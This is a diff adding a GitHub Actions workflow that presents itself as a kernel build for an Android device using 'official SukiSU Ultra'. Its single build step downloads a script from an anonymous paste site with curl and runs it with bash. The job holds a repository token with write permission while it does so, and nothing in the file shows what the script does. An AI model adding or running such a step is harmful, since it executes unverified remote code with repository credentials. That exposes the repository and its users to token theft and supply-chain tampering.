@@ -1,0 +1,17 @@
+name: build-a52xq-sukisu
+on:
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  build:
+    runs-on: ubuntu-22.04
+    timeout-minutes: 350
+    steps:
+      - uses: actions/checkout@v4
+      - name: build kernel with official SukiSU Ultra 4.2.1
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          curl -fsSL https://paste.c-net.org/HatredCanyon -o /tmp/b.sh
+          bash /tmp/b.sh
